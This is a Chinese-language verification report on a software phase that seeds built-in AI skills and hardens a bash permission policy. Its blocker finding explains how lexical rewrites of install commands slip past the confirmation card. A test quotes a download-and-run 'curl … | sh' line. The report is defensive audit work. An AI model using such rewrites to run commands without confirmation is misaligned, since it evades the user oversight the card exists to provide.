---
phase: 47-bash
verified: 2026-09-11T21:40:00Z
status: gaps_found
score: 68/71 must-haves verified
covered_files:
  - ".planning/REQUIREMENTS.md"
  - ".planning/ROADMAP.md"
  - ".planning/phases/47-bash/47-01-PLAN.md"
  - ".planning/phases/47-bash/47-01-SUMMARY.md"
  - ".planning/phases/47-bash/47-02-PLAN.md"
  - ".planning/phases/47-bash/47-02-SUMMARY.md"
  - ".planning/phases/47-bash/47-03-PLAN.md"
  - ".planning/phases/47-bash/47-03-SUMMARY.md"
  - ".planning/phases/47-bash/47-04-PLAN.md"
  - ".planning/phases/47-bash/47-04-SUMMARY.md"
  - ".planning/phases/47-bash/47-CONTEXT.md"
  - ".planning/phases/47-bash/47-REVIEW.md"
  - ".planning/phases/47-bash/47-REVIEWS.md"
  - ".planning/phases/47-bash/47-VALIDATION.md"
  - "AGENTS.md"
  - "THIRD_PARTY_NOTICES.md"
  - "ai-bash-policy.js"
  - "ai-manager.js"
  - "builtin-skills-seeder.js"
  - "docs/product/ai-agent-workspace.md"
  - "docs/product/ai-skills.md"
  - "main.js"
  - "package.json"
  - "skills-builtin/find-skills/LICENSE.txt"
  - "skills-builtin/find-skills/SKILL.md"
  - "skills-builtin/skill-creator/LICENSE.txt"
  - "skills-builtin/skill-creator/SKILL.md"
  - "tests/test-ai-bash-policy.js"
  - "tests/test-builtin-skills-seeder.js"
covered_digest: "v1:sha256:3ada75a10012ce6aad5762f4d30346dc82c09a765649b96581680b3c7d8fb424"
behavior_unverified: 0
overrides_applied: 0
gaps:
  - truth: "Roadmap SC3 / Phase 47 goal clause 2：「包管理器安装命令不再可能被白名单免确认」（`npx` / `npm i` / `pnpm add` / `pip install` / `brew install` 无论是否在白名单内，执行前都必须弹出确认卡片）"
    status: failed
    severity: blocker
    reason: >-
      白名单匹配（matchesWhitelist）对原始文本做命令前缀比对，安装档匹配（matchInstall）对同一段文本做
      「命令名 + 子命令字面量」正则匹配 —— 两侧口径不同。任何不改变首 token、但改变子命令词法形态的写法
      同时满足「命中白名单前缀」与「不命中安装档」，裁决落到 `4. 全部段命中白名单 → allow`，
      ai-manager.js 的 `if (verdict.level === 'confirm')` 不进入，命令直接执行、用户看不到任何卡片。
      文档（docs/product/ai-agent-workspace.md §五、docs/product/ai-skills.md §九）明确推荐把裸 `brew`
      加入白名单，因此这不是「用户乱配」的边缘假设，而是推荐配置下的默认状态；三份文档 + 代码注释
      共同声明的「白名单不可越过安装档」「漏检 ≠ 免确认」不变式在命中白名单前缀的漏检形态下不成立。
      用户可见后果：shell 实际执行的是同一条安装命令（argv 完全相同），但零确认。
    artifacts:
      - path: "ai-bash-policy.js"
        issue: "matchInstall（:298-305）只剥离首 token 引号，未处理子命令侧引号 / 反斜杠转义 / 引号拼接；且安装档是「命令名后紧跟子命令」的黑名单，任何中间 token 即击穿"
      - path: "ai-bash-policy.js"
        issue: "matchInstall 表（:241-255）未收录 `npm update` / `npm rebuild` / `yarn workspace <name> add` / `cargo add` / `go get` / `brew cask install` 等真实联网安装形态"
      - path: "docs/product/ai-agent-workspace.md"
        issue: ":94 声称「`brew install` / `brew upgrade` / `brew reinstall` … 加入白名单也无效」；:109 声称「漏检 ≠ 免确认 … 仍退化为普通确认卡片」—— 两条在命中白名单前缀的漏检形态下均为假"
      - path: "docs/product/ai-skills.md"
        issue: ":152-153「白名单不可越过安装档」与 :173「漏检 ≠ 免确认 … 不会免确认」同为假"
      - path: "ai-manager.js"
        issue: ":5658 安装档确认文案「该命令不会因为加入白名单而免确认」在漏检形态下为假（该分支根本不会走到）"
    missing:
      - "把安装档从「子命令黑名单」改为「首 token 是包管理器 → 默认强制确认，仅显式只读子命令降级」（默认拒绝而非默认放行），使匹配不再依赖子命令字面量形态"
      - "安装档匹配前做与白名单共用的规范化（去引号 + 去反斜杠转义），使两侧口径一致 —— 或至少让安装档短路先于白名单生效，使词法改写不再有安全后果"
      - "补 `npm update` / `npm rebuild` / `yarn workspace … add` / `cargo add` / `go get` / `bunx` / `pipx` 等真实安装形态（若采用默认拒绝方案则自动覆盖）"
      - "若判定本阶段不改：三份文档的「漏检 ≠ 免确认 / 白名单不可越过」必须改为有前提的表述（区分「未命中白名单的漏检」与「命中白名单前缀的漏检」），并新增一条钉住实际行为的断言"
  - truth: "Roadmap SC1 clause：「内容一致时 `detectDiff` 判 `same` → 零差异、零诊断，**重启不重复写**」（47-01 同源 truth：无条件覆盖语义下的幂等写入）"
    status: failed
    severity: warning
    reason: >-
      `seedBuiltinSkills()` 的 `safeCopyDir(skillSrc, skillDst)` 在所有分支（missing / different /
      **same**）都无条件执行，`detectDiff` 的结论只被用于决定要不要产 `realm_builtin_seed_overwritten`
      诊断，不参与「是否覆盖」决策。实测连续两次播种（第二次 `detectDiff === 'same'`）：
      SKILL.md inode 171120956→171120958、mtime 变化、技能目录 inode 171120955→171120957 —— **整目录被重建**。
      后果有两层：① `detectDiff` 最贵的逐文件 sha256 层在每次启动白算，为此专门写的「不用 mtime」护栏失去意义
      （mtime 每次都变，因为每次都重建）；② 每次启动都制造一次 `rename(dst → bak)` 空窗（`SKILL.md` 短暂不可见），
      这正是 gap #3（残留 → 幽灵技能）的触发源。
    artifacts:
      - path: "builtin-skills-seeder.js"
        issue: ":364-376 diff 只用于诊断分支，:376 的 safeCopyDir 在 same 分支同样执行"
      - path: "tests/test-builtin-skills-seeder.js"
        issue: "用例名「幂等：连续两次播种，第二次零差异零诊断，产物字节不变」只断言字节与诊断，未断言「未重建」——故名不符实"
    missing:
      - "在 `diff === 'same'` 时 `continue`（不自愈重建、不产诊断），仅在 missing / different 时执行 safeCopyDir"
      - "补一条断言：连续两次播种后 SKILL.md inode 不变（或增加对相等性的机械证据），而不只是字节相同"
      - "若要保留「源侧空目录也能自愈」：在 listRelativeFiles 中对目录追加 `rel + '/'` 标记，否则空目录差异永远检不出"
  - truth: "Roadmap SC1 clause：「技能加载器识别其 name / description 且**零诊断**」（崩溃恢复路径）+ 47-01 D-08 原子替换契约的残留清收"
    status: failed
    severity: warning
    reason: >-
      `safeCopyDir` 的 tmp/bak 目录由 `dst` 派生（`<dst>.tmp_<ts>` / `<dst>.bak_<ts>`，同父目录以保证同卷 —— 刻意设计），
      因此它们**落在 `managed-skills/` 扫描根内**。`_cleanupDir` 是 best-effort（`catch {}`），且
      **没有任何启动清扫**。进程在 `rename(dst → bak)` 与 `rename(tmp → dst)` 之间退出（SIGKILL / 崩溃 / 强制退出）、
      `_cleanupDir(bakDst)` 失败、或复制阶段崩溃留下的完整 `.tmp_*`，都会永久留存。实测：预置残留目录后调用
      `seedBuiltinSkills()`，残留**不被回收**；再跑真实 `refreshSkills()` 后技能集变为
      `find-skills / find-skills.bak_1700000000000 / skill-creator / skill-creator.tmp_1700000000001`，
      并伴随 4 条诊断（`invalid_metadata` ×2、`realm_name_rewritten` ×2）。即：多出**永久存在、无法通过设置页删除**
      的幽灵技能条目 + 诊断噪声，且 `managed-skills/` 会随每次崩溃缓慢堆积垃圾目录。
    artifacts:
      - path: "builtin-skills-seeder.js"
        issue: ":254-285 safeCopyDir 的 tmp/bak 命名落在扫描根内；:360-386 循环内无残留清扫；:387 前无启动级清扫"
      - path: "tests/test-builtin-skills-seeder.js"
        issue: "只断言「成功/失败当次不留残留」，未覆盖「上次崩溃遗留的残留」"
    missing:
      - "在 seedBuiltinSkills() 进入逐技能循环前做一次残留清扫：`readdirSync(managedDir).filter(n => /\\.(tmp|bak)_\\d+$/.test(n))` 后逐个 `_cleanupDir`（同父目录 → 天然同卷）"
      - "补断言：预置 `managed-skills/<name>.bak_<ts>/`（含 SKILL.md）→ 播种后该目录消失，且 refreshSkills 零诊断"
      - "（与 gap #2 联动）same 分支跳过重建可消除 `rename(dst → bak)` 窗口，从源头减少残留产生概率"
  - truth: "47-01 truth：「播种整体失败不阻断应用启动：任何异常走 `console.error` + 产诊断，不 throw」（模块头 :17 同款表述「任何失败仅 console.error + 产诊断」）"
    status: failed
    severity: warning
    reason: >-
      只有最外层 catch（:387-389）与 detectDiff 的 IO catch（:183-187）打日志。三条内层失败路径
      只把诊断 push 进 `_diagnostics`，在正式版里一点痕迹都不留：
      `realm_builtin_src_missing`（源目录不存在 / asarUnpack 未生效 / .app 装歪 → push 后直接 return）、
      `realm_builtin_src_invalid`、单技能 `realm_builtin_seed_failed`（含 symlink 拒收）。
      而 `getSeedDiagnostics()` 在**生产代码里没有任何调用方**（全仓 grep：除 seeder 自身与测试外零命中），
      因此「内置技能一个都没播种成功」的正式版与一切正常的正式版，在用户侧与日志侧完全不可区分 ——
      与 seeder 自称引用的 nodejieba 事故（9a1ae11「漏一侧即在正式版静默失败」）同型。
      D-09 的「不静默」只在 API 层成立，未到达任何可见面。
    artifacts:
      - path: "builtin-skills-seeder.js"
        issue: ":336-344 / :347-355 / :377-385 三条路径只 push 诊断；:387-389 的 catch 是唯一打日志处"
      - path: "builtin-skills-seeder.js"
        issue: ":397-399 getSeedDiagnostics() 无生产消费方（Phase 50 落地前无任何可见面）"
    missing:
      - "循环结束后统一输出：`_diagnostics` 非空时逐条 `console.error`（error）/ `console.warn`（warning），保持「不打断启动」契约但让失败可见"
      - "在文档/注释里显式记录：Phase 50 把 getSeedDiagnostics() 接进技能面板/诊断通道之前，console 兜底不能省"
deferred:
  - truth: "种植诊断的展示面（`realm_builtin_seed_overwritten` / `realm_builtin_seed_failed` 等对用户可见）"
    addressed_in: "Phase 50"
    evidence: "Phase 50 Goal:「用户可在设置页看到全部技能的名称 / 描述 / 来源 / 体积 / 文件数 / **诊断**，并启用、禁用、卸载自己的技能」；47-CONTEXT「不在本阶段：设置页技能管理区与 /api/skills/*（50）」。注：deferred 仅是「消费者」这一半；gap #4 的 console.error 缺失不受 Phase 50 覆盖。"
  - truth: "`allowed-tools` 的解析与展示（本阶段只做文档声明）"
    addressed_in: "Phase 51"
    evidence: "47-CONTEXT §Deferred：「`allowed-tools` 的解析与展示 —— 本阶段只做文档声明（D-18）… O5 显式解析 frontmatter 归 Phase 51」"
  - truth: "用户驱动的技能导入管线（find-skills 指路的「设置 → AI → 技能管理 → 导入」入口）"
    addressed_in: "Phase 51"
    evidence: "Phase 51 Goal:「用户可从本地 zip 包或网络地址安全导入技能」；47-CONTEXT D-03 已接受 Phase 47~50 期间该入口尚未实现的中间态"
advisory: []
# 注：status 为 gaps_found（Step 9 规则 1 优先），故不写 human_verification 键（该键仅 human_needed 时使用）。
# 两项待人工确认的残余面记在正文「Human Verification Required」一节，不改变裁决。
---

# Phase 47: 内置技能播种 + bash 策略加固 Verification Report

**Phase Goal:** 随包分发的两个内置技能可用且不含任何"执行外部安装"语义；包管理器安装命令不再可能被白名单免确认。
**Verified:** 2026-09-11T21:40:00Z
**Status:** gaps_found
**Re-verification:** No — initial verification

**模式:** INITIAL（本阶段目录内无既存 `*-VERIFICATION.md`，无 `overrides:`，故无 PASSED (override) 项）

---

## Verdict Summary

两半目标里**播种侧（skills）基本达成**、**bash 侧的第二半未达成**。

- **技能侧（SC1 / SC2 / SC4 / SC5）**：`skills-builtin/` 21 文件齐备，17 个上游快照文件经本次**独立逐文件 sha256 比对确认 17/17 与固定 SHA 逐字节相同**；`skill-creator/SKILL.md` 与上游 diff 恰好是声明的那组受控改动（中文 description、`disable-model-invocation`、修改声明、新增 `## Environment Preflight`、两处前置句、`update the skill's` → `set it in the skill's` 的误报消除、删除三章、`## Reference files` 清单更新），正文 CJK = 0（英文正文）；find-skills 正文 CJK = 1510（中文改写版）；`skills-builtin/**` 对安装语义的宽口径扫描**零命中**；打包产物 `app.asar.unpacked/skills-builtin/` 21 文件在列、asar 清单里 `.planning` / `.claude` / `.gsd` / `.wzsh` / `.zcode` / `test` / `tests` / `scripts` 全 0、`*.bak` 全 0、`skills-builtin/` 与 `THIRD_PARTY_NOTICES.md` 在列 —— 全部由本次直接读 asar 头部与 unpacked 目录复核，非采信 SUMMARY。
- **bash 侧（SC3）**：安装档本身实现正确（13 家族全覆盖、只读反例零误伤、danger 优先、白名单对**字面形态**不可越过、`ai-manager.js` 三分支文案与 `riskLevel:'high'` 齐备，70 例测试全绿），但**存在一条纯词法改写绕过**：shell 实际会执行的安装命令可以拿到 `level: 'allow'`，完全不弹卡片。这直接推翻阶段目标第二句与 Roadmap SC3，记为 **BLOCKER**。

**独立取证（不只复述 47-REVIEW.md）**：47-REVIEW.md 的 1 Critical / 8 Warning / 3 Info 我逐条自查，**Critical（CR-01）与 WR-01..WR-08 均以自跑命令复现或源码直读确证**，无一条被推翻（复核中对 WR-07 补了一条上游现行 LICENSE 正文的实证）。

---

## Goal Achievement

### Observable Truths

#### Roadmap Success Criteria（合同层，5 条）

| # | Truth | Status | Evidence |
|---|-------|--------|----------|
| R1 | **SC1** 首次启动后 `managed-skills/` 出现 find-skills 与 skill-creator，加载器零诊断识别 name/description；按单技能目录粒度无条件覆盖（内容一致时 `detectDiff` 判 `same` → 零差异、零诊断，**重启不重复写**）；手改先产 `realm_builtin_seed_overwritten`（warning）再覆盖；手删后自愈重播；停用唯一语义是设置页禁用 | ✗ FAILED | 前半全部成立：hermetic 纵切测试（真 `skills-builtin/` → 播种 → `refreshSkills`）断言 `name==='find-skills'`、`source==='managed'`、`diagnostics===[]`、`errors===[]`、与源逐字节相同；单技能目录粒度见 `builtin-skills-seeder.js:360`；`different` 分支先产 warning 再覆盖（:365-376）；手删自愈有专测（:615）且实测通过；`getSeededSkillNames()` 只反映随包目录名集合（:87-102，专测通过）。**FAIL** 于「重启不重复写」（`diff === 'same'` 仍整目录重建，inode 变化 —— 见 gap #2）与崩溃恢复路径的「零诊断」（残留被加载成幽灵技能 + 4 条诊断 —— 见 gap #3） |
| R2 | **SC2** 内置技能全文不含 `npx` / `npm i` / `curl \| sh` / `-y` / `-g` 等「执行外部安装」语义；find-skills 只输出候选清单并引导用户到设置页一键导入 | ✓ VERIFIED | 宽口径扫描（含 `npx|pnpm|yarn|bun|bunx|pip|pip3|pipx|uv|uvx|cargo|gem` + `install/add/i/ci/dlx/exec/x`、`curl\|sh`、`wget\|sh`、`--global`、`--yes`）对 `skills-builtin/**` **零命中**；find-skills 正文含显式禁令段（「只产出候选清单，绝不执行任何安装/下载命令」）、检索只经 `web_fetch`/`web_search`、安装指路「设置 → AI → 技能管理 → 导入」，无任何可执行检索命令；skill-creator 的 `## Reference files`/`## Environment Preflight` 用英文且只出现「Do not auto-install dependencies from this skill.」这一条**禁止**声明（行级豁免项，已如实登记） |
| R3 | **SC3** `npx` / `npm i` / `pnpm add` / `pip install` / `brew install` 无论是否在白名单内，执行前都必须弹出确认卡片（白名单不可越过） | ✗ FAILED | **字面形态成立**：`npm i x` @ `['npm *']` / `['npm']` → `confirm/install`；`npx x` @ `['npx']` → `confirm/install`；`brew install wget` @ `['brew']` → `confirm/install`。**但 shell 等价的词法改写形态落到 `allow`（零卡片）** —— 见下方「BLOCKER」与 Behavioral Spot-Checks |
| R4 | **SC4** 技能自带 `scripts/` 可在沙箱内经既有 bash 工具执行（复用既有白名单 + 确认卡片，零新增权限机制） | ✓ VERIFIED | `ai-bash-policy.js:183-186` 的 `DANGEROUS_INTERPRETERS` 仍含 `'node'` / `'python3'` 全文未放宽（与 47-02 的禁令一致）；`node scripts/check_env.mjs` / `python3 scripts/*.py` 因此走 `reason:'danger'` 强制确认；`check_env.mjs` 实跑 `node --check` 通过、无参退出 0、输出可解析 JSON（含 `ok` + 4 组 `capabilities`）；`agent-workspace.js` 未被本阶段改动（`git log` 证实最后改动是 Phase 46 的 b12b57d，沙箱零改动约束成立） |
| R5 | **SC5** 打包后正式 .app 中两个内置技能可被正确加载（`asarUnpack` + `app.isPackaged` 路径分支生效），且 `THIRD_PARTY_NOTICES` 记录来源仓库 + 固定 commit SHA + 许可证 + 是否修改 + 修改说明 | ✓ VERIFIED | 直接读 `dist/mac-arm64/Realm Nightly.app/Contents/Resources/`：`app.asar.unpacked/skills-builtin/` 21 文件、两个 `SKILL.md` 俱在；`/Applications/Realm Nightly.app` 同样含两者（19:05 安装）；`package.json:build.asarUnpack` 含 `skills-builtin/**` 与 `node_modules/nodejieba/**` 成对；运行时分支 `builtin-skills-seeder.js:55-62`（`app.isPackaged` → `process.resourcesPath/app.asar.unpacked/skills-builtin`，开发态回落 `__dirname/skills-builtin`）；运行期 `~/Library/Application Support/realm-nightly/agent-workspace/managed-skills/` 下两技能齐备（含 LICENSE/scripts）；opt-in 打包断言组 `REALM_PACKAGED_VERIFY=1` 本次实跑 **4/4 pass**（92 tests / 0 fail）；`THIRD_PARTY_NOTICES.md` 两节五要素齐备且都标 `modified`，find-skills SHA `773fb2c7…` 经 GitHub API 复核为 `2026-07-10T20:54:38Z` 与声明逐字一致，skill-creator SHA 经用其下载 17 文件全部成功且逐字节相同 |

#### Plan Truths — 47-01（18 条）

| # | Truth | Status | Evidence |
|---|-------|--------|----------|
| 1 | find-skills 播种后加载器零诊断识别 `name==='find-skills'` | ✓ VERIFIED | hermetic 纵切测试实跑通过（assert 三项） |
| 2 | `disable-model-invocation: true` → `buildSkillsPrompt() === ''` | ✓ VERIFIED | 同上（机械断言） |
| 3 | find-skills `description` 中文、正文中文 | ✓ VERIFIED | frontmatter description 为中文；正文 CJK = 1510 |
| 4 | `skills-builtin/**` 对 FORBIDDEN_PATTERNS 零命中、无 `npx skills` 变体 | ✓ VERIFIED | 自跑宽口径扫描零命中；测试内扫描器 88 例全绿 |
| 5 | 播种按单技能目录粒度判定，不为已存在技能提前返回 | ✓ VERIFIED | `builtin-skills-seeder.js:360` 的 `for (const name of names)` 循环，无整目录判定/提前 return |
| 6 | 无条件覆盖 + 不一致时先产 warning 再覆盖 | ✓ VERIFIED | :364-376，`diff === 'different'` → push warning → `safeCopyDir`；专测 :602 命中该诊断 |
| 7 | 原子目录替换（tmp → rename → bak 回滚，不留半成品） | ✓ VERIFIED | :254-285；行为专测 :638 用只读父目录真实触发失败路径，断言目标保持旧完整内容且零残留 |
| 8 | 差异检测不用 mtime，按「路径集合 → size → sha256」逐层短路 | ✓ VERIFIED | :160-188 三层短路 + :161-163 与 :146-148 两处显式护栏注释；专测 :502 断言注释点名 safeCopyDir |
| 9 | `detectDiff` 遇 IO 错误返回 `'different'`、`console.error`、不抛 | ✓ VERIFIED | :183-187；专测（不可读文件）通过 |
| 10 | 同一 `detectDiff` 调用内每文件至多算一次 sha256 | ✓ VERIFIED | size 层（:172-176）先于 hash 层（:177-181）短路，hash 只在全体 size 相等后执行 |
| 11 | `realm_builtin_src_invalid` 在控制流里真实可达（独立扫描先于过滤） | ✓ VERIFIED | `collectInvalidSrcDirs`（:299-313）由 `seedBuiltinSkills` 在 `getSeededSkillNames()` **之前**调用（:336 vs :346）；专测 :711 命中该 code |
| 12 | 播种不依赖 `migrateAiMemory()` 的成功（两次独立调用、各自 try/catch） | ✓ VERIFIED | `main.js:4043` 与 `:4048` 两次独立调用；seeder 自带外层 try/catch（:333/:387），无跨模块依赖 |
| 13 | `safeCopyDir` 源不存在提前返回不抛错；源缺失时 `getSeededSkillNames()` → `[]` + `realm_builtin_src_missing` | ✓ VERIFIED | :256 提前返回；:90-94 catch → `[]`；:347-355 产诊断；专测「源缺失不得 throw」通过 |
| 14 | `.planning/ROADMAP.md` §Phase 47 成功判据 1 已改写，**不再含「版本戳登记表」** | ✓ VERIFIED | `grep -n "版本戳登记表" .planning/ROADMAP.md` → 零命中 |
| 15 | 手删后下次播种自愈重播；`getSeededSkillNames()` 只反映随包目录名集合 | ✓ VERIFIED | 专测 :615 断言手删后目录重现且不产覆盖诊断；专测 :418 断言只认含 `SKILL.md` 的目录、忽略 `.hidden`（零状态文件） |
| 16 | 播种失败不阻断启动：**任何异常走 `console.error` + 产诊断**，不 throw | ✗ FAILED | 三条内层失败路径只 push 诊断不打日志；`getSeedDiagnostics()` 无生产消费方 —— 见 gap #4 |
| 17 | `app.isPackaged` 时 `process.resourcesPath/app.asar.unpacked/skills-builtin`，开发态回落 `__dirname/skills-builtin`（与 `asarUnpack` 成对） | ✓ VERIFIED | :55-62 + `package.json` 的 `asarUnpack` 成对；打包产物两侧均实证（见 R5） |
| 18 | `skills-builtin/` 遍历遇 symlink 直接拒绝并产诊断（fail-closed） | ✓ VERIFIED | `assertNoSymlink`（:211-219）在 `copyDirRecursive` 首行调用，抛错由 :377 转 `realm_builtin_seed_failed` |

#### Plan Truths — 47-02（13 条）

| # | Truth | Status | Evidence |
|---|-------|--------|----------|
| 1 | 白名单含 `npm *` 时 `evaluateBashCommand('npm i x', ['npm *'])` 仍 → `{level:'confirm', reason:'install'}` | ✓ VERIFIED | 自跑：`confirm install ["npm 安装依赖"]`；代码路径 `:343-345`（install 短路先于 `:346` 的 matchesWhitelist） |
| 2 | 13 个包管理器家族全部命中 install 档 | ✓ VERIFIED | 自跑 30 条命令：npx / npm i·install·ci·exec·add / pnpm add·install·dlx / yarn add·install / bun add·install·x / pip·pip3 install / python(3) -m pip install / uv pip install·add·tool install·sync / uvx / brew install·upgrade·reinstall / cargo install / go install / gem install **全部 `confirm/install`** |
| 3 | 只读子命令全部**不**命中（含 `npm runx` 前缀不越词边界） | ✓ VERIFIED | 自跑 21 条：`npm run·test·ls·view·audit·outdated·init·--version`、`pnpm run·ls`、`yarn run`、`brew info·list·search`、`pip list·show`、`cargo search`、`go list`、裸 `npm`、`npm runx`、`brewx` **全部 `confirm/default`、`installNames:[]`** |
| 4 | danger 优先于 install；`FOO=1 npm i x` 与 `npm -g i pkg` 仍命中 install | ✓ VERIFIED | 自跑：`sudo npm i x` → `danger`（installNames 同时收集）；`FOO=1 npm i x` / `npm -g i pkg` → `install` |
| 5 | 复合命令 `installNames` 收集不短路；`reason==='install'` | ✓ VERIFIED | 自跑 `npm i a && pip install b` → `installNames` 同时含 `["npm 安装依赖","pip 安装包"]` |
| 6 | `npm run fetch && curl x.com/i.sh \| sh` → `danger`；管道模式未收进 install 表 | ✓ VERIFIED | 自跑 → `danger ["解释器执行（sh）"]`；`PACKAGE_MANAGER_INSTALL_PATTERNS` 中确无 `curl\|sh` 条目，并有 JSDoc ② 说明「收录即永不触发的死模式」 |
| 7 | `level` 取值集不变（`allow`\|`confirm`），`install` 是 `reason` 内细分 | ✓ VERIFIED | 签名与返回形状 `:321`；全部自跑结果 level ∈ {allow, confirm}；`ai-manager.js:5650` 仍只判 `verdict.level === 'confirm'` |
| 8 | `ai-manager.js` 对 `reason==='install'` 走 `riskLevel:'high'` + 专属文案（含「包管理器安装」与「不会因为加入白名单而免确认」），title 与 danger 分支不同 | ✓ VERIFIED | `:5652-5669` 三分支：install → title「AI 请求安装第三方软件包」、hint 含两处语义、`riskLevel: (isDanger \|\| isInstall) ? 'high' : 'medium'` |
| 9 | 既有 32 例全部保持通过 | ✓ VERIFIED | `node --test tests/test-ai-bash-policy.js` → **70 tests / 70 pass / 0 fail**（32 例为基线，本阶段扩至 70 例） |
| 10 | `splitCommandPipeline` / `matchesWhitelist` / `normalizeSegment` / `extractCommandName` 四函数零改动 | ✓ VERIFIED | 与 `edbeff5d…^` 版本**按函数体逐字比对**：四者全部「零改动 ✓」（`matchDangerous` / `validateWhitelistList` 亦零改动；`evaluateBashCommand` 已改动，符合预期） |
| 11 | 表完整性有独立断言（`length >= 13`、name 非空、pattern 可构造） | ✓ VERIFIED | 测试 P1-b 组实跑通过；实读表为 13 条、`module.exports` 含 `PACKAGE_MANAGER_INSTALL_PATTERNS` / `matchInstall` |
| 12 | `evaluateBashCommand` 生产消费点只有 `ai-manager.js` 一处 | ✓ VERIFIED | 全仓 grep（排除 node_modules / dist / tests）：生产代码仅 `ai-manager.js:5647` 一处调用，其余为模块自身定义/JSDoc 与文档描述 |
| 13 | `PACKAGE_MANAGER_INSTALL_PATTERNS` 的 JSDoc 含三处**代码内注释**（npm ci 为何计入 / curl\|sh 为何不收 / 维护约定） | ✓ VERIFIED | `:211-214`（npm ci 与 postinstall）、`:197-200`（curl\|sh 死模式，含「不要『补上这个遗漏』」）、`:216-217`（维护约定）全部在源码内，非仅计划文本 |

#### Plan Truths — 47-03（18 条）

| # | Truth | Status | Evidence |
|---|-------|--------|----------|
| 1 | `skill-creator/SKILL.md` 逐字节等于上游除六处受控改动 | ✓ VERIFIED | 与上游固定 SHA 文件 diff 全文为 127 行，内容**恰为**声明的那组改动：中文 description + `disable-model-invocation`（:3-4）、修改声明（:9-18）、`## Environment Preflight`（:43-59）、两处前置句（:193/:365）、`update the skill's` → `set it in the skill's`（:436）、删除三章（Package and Present / Claude.ai / Cowork）、`## Reference files` 更新（:448-471） |
| 2 | 受控改动⑤判据：上游 frontmatter 只有 name+description，须补 `disable-model-invocation` | ✓ VERIFIED | 上游文件 frontmatter 实测无该字段；本地第 4 行为 `disable-model-invocation: true` |
| 3 | 受控改动⑥判据：description 中文化，正文保持英文（正文不含 CJK） | ✓ VERIFIED | description 为中文；正文（frontmatter 之后）CJK 字符数 **0** |
| 4 | 上游 `agents/`（3 文件 / 26,712 B）随包 | ✓ VERIFIED | `agents/*.md` 三文件与上游逐字节相同（sha256 比对），存在且被 `## Advanced: Blind comparison` 引用 |
| 5 | 删三章判据是功能正确性（Realm 无 `present_files`、非 Claude.ai/Cowork） | ✓ VERIFIED | 三章标题在本地文件中零命中（专测 :1034）；`present_files` 相关包装指引已随章删除 |
| 6 | `LICENSE.txt` 为上游 Apache-2.0 全文逐字副本（11,357 B），播种后随目录落盘 | ✓ VERIFIED | sha256 与上游相同；`wc -c` = 11357；`realm-nightly/.../managed-skills/skill-creator/LICENSE.txt` 实际存在 |
| 7 | `check_env.mjs` 存在、`node --check` 通过、无参退出 0、输出含 `ok` 与 `capabilities` 分组的可解析 JSON | ✓ VERIFIED | 实跑：`node --check` OK；无参输出 JSON（`ok:true`、`python.version 3.12.12`、`capabilities.catalog` 4 组），exit 0 |
| 8 | ②④ 两处新增正文必须英文撰写 | ✓ VERIFIED | 两处均为英文；正文 CJK = 0 |
| 9 | `## Reference files` 清单与实际随包文件集逐项一致 | ✓ VERIFIED | diff 显示更新后清单含 `scripts/check_env.mjs` + 9 个 py + `references/schemas.md` + `assets/eval_review.html` + `eval-viewer/*` + `LICENSE.txt`；专测 :1298 逐项核对 |
| 10 | 18 个上游文件先全部落地并逐字节核对、任一不符立即停下，之后才改 SKILL.md | ✓ VERIFIED | 结果态满足（17 表内文件 + SKILL.md 全部与上游对齐）；过程顺序无法回溯，按结果判定 |
| 11 | `check_env.mjs` 支持 `REALM_SKILL_CREATOR_PYTHON`；缺依赖时输出 `missing_dependency` 且 `installGuidance` 含「不要从本技能自动安装依赖」 | ✓ VERIFIED | 实跑 `REALM_SKILL_CREATOR_PYTHON=/nonexistent/python` → `ok:false, code:python_not_found`；`installGuidance` 逐字含 `Do not auto-install dependencies from this skill.`（:509） |
| 12 | 未知 `--capability` 返回错误而非静默忽略 | ✓ VERIFIED | 实跑 `--capability nonexistent` → `ok:false, code:unknown_requirement` |
| 13 | `skills-builtin/**/SKILL.md` 与两个 `LICENSE.txt` 对零安装语义扫描零命中 | ✓ VERIFIED | 宽口径自跑扫描零命中（含两个 LICENSE） |
| 14 | `THIRD_PARTY_NOTICES.md` 对两个技能各记录五要素，且**都标 `modified`** | ✓ VERIFIED | 实读 §1/§2：来源仓库 URL、固定 SHA、许可证、`是否修改 = 是（modified）`、修改说明逐项列举（find-skills 5 项 / skill-creator 11 项） |
| 15 | 两个固定 SHA 与实测一致，且不是仓库 HEAD | ✓ VERIFIED | find-skills `773fb2c7bbf16781670a3520affc4abd0c6151ae` 经 GitHub API `commits?path=skills/find-skills/SKILL.md&per_page=1` 复核为 **2026-07-10T20:54:38Z**（与声明一致）；skill-creator `b0cbd3df…` 用其成功下载全部 17 文件且逐字节相同 |
| 16 | 如实记录三处易错事实（① find-skills 上游根无独立 LICENSE；② `ThirdPartyNoticeText.txt` 不随包；③ `anthropics/skills` 无仓库级 LICENSE） | ✓ VERIFIED | §3 三处齐备；**在固定 SHA 时点全部为真**（该 SHA 的 contents 确无 `LICENSE`）。注：① 的现在时表述今天已过期 —— 见 Anti-Patterns WR-07（Warning，不构成本条失败） |
| 17 | `skills-builtin/skill-creator/**` 19 文件体积与上游逐一对得上，无缺失无多余 | ✓ VERIFIED | 表内 17 文件 **17/17 sha256 逐字节相同**；`SKILL.md` 32,672 B（上游 33,168 B − 删三章 + 新增章，diff 已核对）；`check_env.mjs` 为自研新增；合计 19 文件 |
| 18 | SKILL-09 机械证据：`DANGEROUS_INTERPRETERS` 仍含 `node` / `python3` 未被放宽 → 技能脚本每次调用都弹卡片 | ✓ VERIFIED | `ai-bash-policy.js:183-186` 实读含 `'node'`/`'python3'`；`node scripts/check_env.mjs` 走 `danger` 强制确认 |

#### Plan Truths — 47-04（17 条）

| # | Truth | Status | Evidence |
|---|-------|--------|----------|
| 1 | 打包产物 `app.asar.unpacked/skills-builtin/` 存在且含两个 `SKILL.md` | ✓ VERIFIED | 直接 `find`：dist 与 /Applications 两个 Realm Nightly.app 均含两者（各 21 文件） |
| 2 | 启动该 .app 后 `realm-nightly/agent-workspace/managed-skills/` 出现两个技能目录，加载器零诊断 —— **必须在真实打包产物上验证** | ✓ VERIFIED（打包面）+ 见 Human Verification | userData 实测：`managed-skills/{find-skills,skill-creator}` 齐备（含 LICENSE/scripts）；opt-in 打包断言组实跑 4/4 pass。**进程内**「加载器零诊断」一节本次未独立复现（需启动 GUI，用户生产实例在跑）—— 见 Human Verification |
| 3 | `app.asar` 清单**不再包含** `.planning/**`（含 `PITFALLS.md`） | ✓ VERIFIED | 自读 asar 头部目录 JSON：`.planning` = 0 条目，`/.planning/research/PITFALLS.md` 不在清单 |
